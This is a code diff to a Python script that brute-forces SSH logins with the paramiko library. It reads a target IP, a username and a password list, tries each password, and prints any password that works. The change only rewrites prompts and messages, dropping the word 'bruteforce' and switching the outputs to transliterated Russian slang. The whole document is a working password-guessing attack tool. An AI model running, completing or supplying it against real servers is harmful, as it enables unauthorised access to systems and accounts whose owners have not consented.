@@ -2,9 +2,9 @@ import paramiko
 import sys
 import os
 
-target = str(input('Please enter target IP address: '))
-username = str(input('Please enter username to bruteforce: '))
-password_file = str(input('Please enter location of the password file: '))
+target = str(input(' target IP address: '))
+username = str(input(' username: '))
+password_file = str(input(' location of the password file: '))
 
 def ssh_connect(password, code=0):
     ssh = paramiko.SSHClient()
@@ -25,10 +25,10 @@ with open(password_file, 'r') as file:
             response = ssh_connect(password)
 
             if response == 0:
-                 print('password found: '+ password)
+                 print('DERJI PAROL: '+ password)
                  exit(0)
             elif response == 1: 
-                print('no luck')
+                print('OTVAL')
         except Exception as e:
             print(e)
         pass
